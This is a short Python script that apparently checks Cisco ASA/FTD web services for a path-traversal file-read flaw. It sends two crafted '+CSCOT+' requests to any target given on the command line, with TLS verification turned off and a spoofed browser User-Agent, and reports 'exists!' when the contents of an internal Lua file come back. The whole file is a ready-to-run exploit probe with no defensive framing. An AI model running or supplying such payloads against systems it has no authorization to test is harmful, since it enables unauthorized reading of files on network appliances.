# -*- coding: utf-8 -*-
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


target = sys.argv[1]


payloads = ['/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua',
			'/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../']
headers = {
	"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}
try:
	for p in payloads:
		url = target.rstrip('/') + p
		req = requests.get(url,headers=headers,timeout=30,verify=False)
		text = req.text
		if 'dofile("/+CSCOE+/include/browser_inc.lua")' in text:
			print 'exists!'
except Exception as e:
	print str(e)